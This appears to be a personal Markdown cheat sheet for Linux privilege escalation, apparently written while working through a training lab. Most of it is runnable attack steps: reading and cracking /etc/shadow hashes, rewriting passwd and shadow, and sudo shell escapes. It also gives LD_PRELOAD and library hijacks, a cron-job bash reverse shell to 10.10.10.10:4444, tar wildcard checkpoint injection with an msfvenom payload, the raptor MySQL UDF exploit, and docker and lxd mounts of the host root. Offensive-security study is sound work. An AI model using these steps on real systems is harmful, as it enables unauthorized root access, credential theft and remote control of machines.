# Linux Privlage Escalation
### Basic Enumeration
````
whoami
pwd
id
````
- OS, Kernel & Hostname
````
cat /etc/issue 
cat /proc/version 
hostname 
uname -a
searchsploit linux kernel 3.9
````
- To remove DoS exploits by adding -exclude=”/dos/”
### Weak File Permissions - Readable /etc/shadow
```
ls -l /etc/shadow
cat /etc/shadow
```
- A users password hash (if they have one) can be found between the first and second (:) of each line.
- Save the root user's hash to a file called hash.txt on your kali machine and use john to crack it.
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- Switch to the root user
```
su root
```
### Weak File Permissions - Writeable /etc/shadow
```
ls -l /etc/shadow
```
- Generate a new password hash
```
mkpasswd -m sha-512 jackiscool
```
- Edit /etc/shadow and replace origional root user's password hash with the one that you just created
- Switch to the root user
```
su root
```
### Weak File Permissions - Writable /etc/passwd
- The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
- The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. 
````
ls -l /etc/passwd
````
- Generate a new password hash with a password of your choice:
````
openssl passwd newpasswordhere
````
- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
- Switch to the root user, using the new password:
````
su root
````
- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
- Now switch to the newroot user, using the new password:
````
su newroot
````
### Sudo-Shell escape Sequences
- List the programs which sudo allows your user to run:
````
sudo -l
````
Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
- SUID
````
Sudo -l
````
- iftop
````
sudo /usr/bin/iftop
!/bin/bash #hit enter
````
- find
````
sudo /usr/bin/find . -exec /bin/bash \; -quit
````
- nano
````
sudo /usr/bin/nano
Press ctrl+r then ctrl +x 
Reset; bash 1>&0 2>&0
````
- vim
````
Sudo vim -c ‘:!/bin/bash’
````
- man
````
sudo /usr/bin/man man
!/bin/sh
````
- awk
````
sudo awk 'BEGIN {system("/bin/bash")}'
````
- less
````
sudo /usr/bin/less /etc/profile
!/bin/sh
````
- FTP
````
sudo /usr/bin/ftp
!/bin/bash
````
- NMAP
- Method 1
````
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
````
- Method 2
````
sudo nmap --interactive
!bash
````
- more
````
TERM= sudo -E more /etc/profile
!/bin/bash
````
### Sudo Environment Variables
- Sudo can be configured to inherit certain environment variables from the user's environment.
- Check which environment variables are inherited (look for the env_keep options):
- Output you're looking for
````
user@debian:~/tools/sudo$ sudo -l
Matching Default entries for user on this host:
  env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
````
````
sudo -l
````
- LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. 
- LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
- Create a shared object using the code located at /home/user/tools/sudo/preload.c:
- preload.c code in another file in this repo:
````
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
````
- Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
````
sudo LD_PRELOAD=/tmp/preload.so program-name-here
````
- A root shell should spawn. 
- Run ldd against the apache2 program file to see which shared libraries are used by the program:
````
ldd /usr/sbin/apache2
````
- Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
````
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
````
- Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
````
sudo LD_LIBRARY_PATH=/tmp apache2
````
- A root shell should spawn. 
- Errors: Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. 
- Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
### Cron Jobs -File permissions
- Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
- Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
- View the contents of the system-wide crontab:
````
cat /etc/crontab
````
- There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
- Locate the full path of the overwrite.sh file:
````
locate overwrite.sh
````
- Note that the file is world-writable:
````
ls -l /usr/local/bin/overwrite.sh
````
- Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
````
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
````
- Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
````
nc -nvlp 4444
````
### Cron Jobs Path Environment Variable
- View the contents of the system-wide crontab:
````
cat /etc/crontab
````
- Note that the PATH variable starts with /home/user which is our user's home directory.
- Create a file called overwrite.sh in your home directory with the following contents:
````
#!/bin/bash
 
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
````
- Make sure that the file is executable:
````
chmod +x /home/user/overwrite.sh
````
- Wait for the cron job to run. Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:
````
/tmp/rootbash -p
````
### CronJobs - Wildcards
- View the contents of the other cron job script:
````
cat /usr/local/bin/compress.sh
````
- Note that the tar command is being run with a wildcard (*) in your home directory.
- Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
````
- Transfer the shell.elf file to /home/user/ on the Debian VM.
````
chmod +x /home/user/shell.elf
````
- Create these two files in /home/user:
````
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
````
- When the tar command in the cron job runs, the wildcard (*) will expand to include these files. 
- Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
- Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
````
nc -nvlp 4444
````
### SUID/SGID Executables --Known Exploits
- Find all the SUID/SGID executables on the Debian VM:
````
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
````
- Note that /usr/sbin/exim-4.84-3 appears in the results. Exploit is in this repo. 
- Exploit-DB, Google, and GitHub are good places to search!
- Check GTFO Bins and Google for SUID/SGID!!!


















### Service Exploits
- https://www.exploit-db.com/exploits/1518
- The mysql service is running as root and the 'root' user for the service does not have a password assigned or the password is known. This exploit takes advantage of the User Defined Functions (UFDs) to run system commands as root via the mysql service.
- Change into the `/home/user/tools/mysql-udf` directory.
```
cd /home/user/tools/mysql-udf
```
- Compile the raptor_udf2.c exploit code using the following
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
- Connect to the mysql service as the root user with a blank or known password.
```
mysql -u root
```
- Execute the following commands on the mysql shell to create a udf "do_system" using the compiled exploit
```
use mysql;
create table foo(line blob);
insert into foo values (load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
- Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
- Exit out of the mysql shell
```
\q
```
- Run /tmp/rootbash with -p to gain a root shell
`/tmp/rootbash -p`
### Docker Linux Local PE
```
id
```
- Check to see if the user is in the docker group
```
docker run hello-world
```
- Check to see if docker is installed and working correctly
```
docker run -v /root:/mnt alpine cat /mnt/key.txt
```
- `-v` specifies a volume to mount, in this case the /root directory on the house was mounted to the /mnt directory on the container.  Because docker has SUID we were able to mount a root owned directory in our container
```
docker run -it -v /:/mnt alpine chroot /mnt
```
- Roots the host with docker because we used chroot on the /mnt directory.  This allowed us to use the host operating system.
```
docker run -it ubuntu bash
```
- Optional: Run an ubuntu container with docker
### lxd Group Priv Esc
- Exploit without internet connection
- Change to the root user on attack box
```
sudo su
```
- Install Requirements on your attack box
```
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
```
- Clone the repo (attack box)
```
sudo go get -d -v github.com/lxc/distrobuilder
```
- Make distrobuilder (attack box)
```
cd $HOME/go/src/github.com/lxc/distrobuilder
make
```
- Prepare the creation of Alpine (attack box)
```
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```
- Create the container (attack box)
```
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
-If that fails, run it adding `-o image.release=3.8` at the end

- Upload `lxd.tar.xz` and `rootfs.squashfs` to the vulnerable server
- Add the image on the vulnerable server
```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
```
- Second command is only if you want to confim the imported image is present
- Create a container and add the root path
```
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
- Execute the container
```
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root
```
- `/mnt/root` is where the file system is mounted.
##### Errors (on the vulnerable server)
- If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
- You need to initialize lxd before using it
```
lxd init
```
- Read the options and use the defaults


